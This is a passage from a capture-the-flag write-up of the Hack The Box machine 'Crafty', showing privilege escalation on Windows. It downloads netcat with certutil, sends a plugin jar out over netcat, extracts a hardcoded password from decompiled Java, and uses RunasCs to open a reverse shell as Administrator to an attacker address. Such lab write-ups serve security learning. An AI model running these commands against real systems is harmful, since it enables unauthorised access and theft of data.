</span></span></span><span class=line><span class=cl><span class=go>10/27/2023  02:48 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>10/27/2023  02:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go>               1 File(s)          9,996 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   3,814,014,976 bytes free
</span></span></span></code></pre></div><p>To download this file I pass a <code>netcat</code> binary for <code>Windows</code> using <code>certutil</code>. First start a temporal <code>HTTP</code> <code>Python</code> server on port <code>8080</code> in our attacker machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>log4j-shell-poc  nc64.exe  pyCraft
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span></code></pre></div><p>and in the target machine, run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;certutil.exe -urlcache -split -f http://10.10.16.2:8080/nc64.exe c:\Users\svc_minecraft\Downloads\nc.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>certutil.exe -urlcache -split -f http://10.10.16.2:8080/nc64.exe c:\Users\svc_minecraft\Downloads\nc.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  b0d8
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span></code></pre></div><p>Next, use the <code>netcat</code> binary to download the file <code>c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar</code>. In our machine start a <code>netcat</code> listener on port <code>4444</code> and save everything received in this port into a file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 4444 &gt; playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 4444 ...
</span></span></span></code></pre></div><p>and in the victim machine, pass the file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;c:\Users\svc_minecraft\Downloads\nc.exe 10.10.16.2 4444 &lt; c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\Users\svc_minecraft\Downloads\nc.exe 10.10.16.2 4444 &lt; c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
</span></span></span></code></pre></div><p>We get a connection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 4444 &gt; playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 4444 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.249] 49684
</span></span></span></code></pre></div><p>and after some time press <code>Ctrl+C</code>.</p><p>Finally, check that the <code>MD5</code> hashes of both files are the same to check the integrity of the files. In the victim machine (the original file) we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;certutil.exe -hashfile c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar MD5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>certutil.exe -hashfile c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar MD5
</span></span></span><span class=line><span class=cl><span class=go>MD5 hash of c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar:
</span></span></span><span class=line><span class=cl><span class=go>349f6584e18cd85fc9e014da154efe03
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -hashfile command completed successfully.
</span></span></span></code></pre></div><p>and in my attacker machine, I run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ md5sum playercounter-1.0-SNAPSHOT.jar
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>349f6584e18cd85fc9e014da154efe03  playercounter-1.0-SNAPSHOT.jar
</span></span></span></code></pre></div><p>Since both hashes are the same the file has been successfully transferred.</p><p>Now, analyze the <code>.jar</code> <code>Java</code> file with <code>Java Decompiler</code> (<code>jd-gui</code>). We can install it with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo apt install jd-gui
</span></span></span></code></pre></div><p>and run it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ jd-gui &amp;&gt; /dev/null &amp; disown
</span></span></span></code></pre></div><p>Open the <code>playercounter-1.0-SNAPSHOT.jar</code> with the decompiler. We can see a class called <code>Playercounter.class</code>:</p><p><img alt="Crafty 2" src=/pentesting/images/Crafty_2.png></p><p>or</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>htb.crafty.playercounter</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.PrintWriter</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>net.kronos.rkon.core.Rcon</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>net.kronos.rkon.core.ex.AuthenticationException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.bukkit.plugin.java.JavaPlugin</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kd>class</span> <span class=nc>Playercounter</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>JavaPlugin</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onEnable</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Rcon</span><span class=w> </span><span class=n>rcon</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>rcon</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Rcon</span><span class=p>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=p>,</span><span class=w> </span><span class=n>27015</span><span class=p>,</span><span class=w> </span><span class=s>&#34;s67u84zKq8IXw&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>AuthenticationException</span><span class=w> </span><span class=n>e2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rcon</span><span class=p>.</span><span class=na>command</span><span class=p>(</span><span class=s>&#34;players online count&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>PrintWriter</span><span class=w> </span><span class=n>writer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PrintWriter</span><span class=p>(</span><span class=s>&#34;C:\\inetpub\\wwwroot\\playercount.txt&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;UTF-8&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>writer</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>result</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e3</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e3</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onDisable</span><span class=p>()</span><span class=w> </span><span class=p>{}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>where I can see something like a credential/password: <code>s67u84zKq8IXw</code></p><p>What if this is the <code>Administrator</code> password? We have 2 potential users in this machine: <code>jacob</code> and <code>Administrator</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;net user
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>net user
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User accounts for \\CRAFTY
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Administrator            DefaultAccount           Guest
</span></span></span><span class=line><span class=cl><span class=go>jacob                    svc_minecraft            WDAGUtilityAccount
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>Since we don&rsquo;t have <code>Server Message Block</code> (<code>SMB</code>) or <code>Windows Remote Management</code> services running, we will have to use <code>RunasCs</code>. Download it from its <a href=https://github.com/antonioCoco/RunasCs/releases/tag/v1.5 class=external-link target=_blank rel=noopener>Github repository</a>, unzip it and pass the <code>.exe</code> file to the target as we have passed previously the <code>netcat</code> binary. Then, run <code>RunasCs</code> as <code>Administrator</code> using the found password in the target machine. Start a <code>netcat</code> listener on port <code>443</code> and in the victim machine, run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;c:\Users\svc_minecraft\Downloads\runascs.exe Administrator s67u84zKq8IXw &#34;C:\Users\svc_minecraft\Downloads\nc.exe 10.10.16.2 443 -e C:\Windows\System32\cmd.exe&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\Users\svc_minecraft\Downloads\runascs.exe Administrator s67u84zKq8IXw &#34;C:\Users\svc_minecraft\Downloads\nc.exe 10.10.16.2 443 -e C:\Windows\System32\cmd.exe&#34;
</span></span></span></code></pre></div><p>and get a shell as <code>Administrator</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.249] 49687
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5329]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>crafty\administrator
</span></span></span></code></pre></div><p>and we can read the <code>root.txt</code> flag at <code>C:\Users\Administrator\Desktop</code>directory.</p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>